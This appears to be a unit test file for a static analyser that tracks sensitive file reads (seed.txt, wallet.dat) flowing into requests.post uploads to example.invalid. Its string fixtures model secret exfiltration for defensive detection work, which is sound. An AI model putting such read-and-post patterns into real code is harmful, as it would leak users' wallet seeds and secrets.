import unittest
from ward.source_rules import python_findings


class PythonFlowTests(unittest.TestCase):
    def uploads(self, source):
        return [item for item in python_findings('from pathlib import Path\nimport requests\n' + source, 'fixture.py')
                if item['kind'] == 'python-sensitive-data-upload']

    def test_read_in_either_branch_reaches_upload(self):
        for block in ('if ready:\n    seed = Path("seed.txt").read_text()',
                      'if ready:\n    seed = "public"\nelse:\n    seed = Path("seed.txt").read_text()',
                      'with open("seed.txt") as f:\n    seed = f.read()',
                      'for item in items:\n    seed = Path("seed.txt").read_text()',
                      'try:\n    seed = Path("seed.txt").read_text()\nexcept OSError:\n    seed = "public"'):
            with self.subTest(block=block):
                self.assertEqual(len(self.uploads(block + '\nrequests.post("https://example.invalid", data=seed)')), 1)

    def test_straight_line_path_and_data_overwrites_remove_stale_taint(self):
        for source in ('path = "wallet.dat"\npath = "public.txt"\ndata = Path(path).read_text()',
                       'data = Path("seed.txt").read_text()\ndata = "public"',
                       'path = "wallet.dat"\nif ready:\n    path = "public.txt"\nelse:\n    path = "status.txt"\ndata = Path(path).read_text()',
                       'try:\n    data = Path("seed.txt").read_text()\nfinally:\n    data = "public"'):
            with self.subTest(source=source):
                self.assertEqual(self.uploads(source + '\nrequests.post("https://example.invalid", data=data)'), [])

    def test_one_branch_overwrite_does_not_clear_other_path(self):
        source = 'path = "wallet.dat"\nif ready:\n    path = "public.txt"\ndata = Path(path).read_text()\nrequests.post("https://example.invalid", data=data)'
        self.assertEqual(len(self.uploads(source)), 1)

    def test_local_backup_unrelated_upload_and_function_local_remain_controls(self):
        source = 'seed = Path("seed.txt").read_text()\nPath("backup.txt").write_text(seed)\nrequests.post("https://example.invalid", data="ok")'
        self.assertEqual(self.uploads(source), [])
        source = 'def backup():\n    seed = Path("seed.txt").read_text()\n    Path("backup.txt").write_text(seed)\nrequests.post("https://example.invalid", data=seed)'
        self.assertEqual(self.uploads(source), [])

    def test_rhs_uses_state_before_overwrite_and_augmented_assign_preserves_it(self):
        source = 'data = "seed.txt"\ndata = Path(data).read_text()\ndata += " suffix"\nrequests.post("https://example.invalid", data=data)'
        self.assertEqual(len(self.uploads(source)), 1)
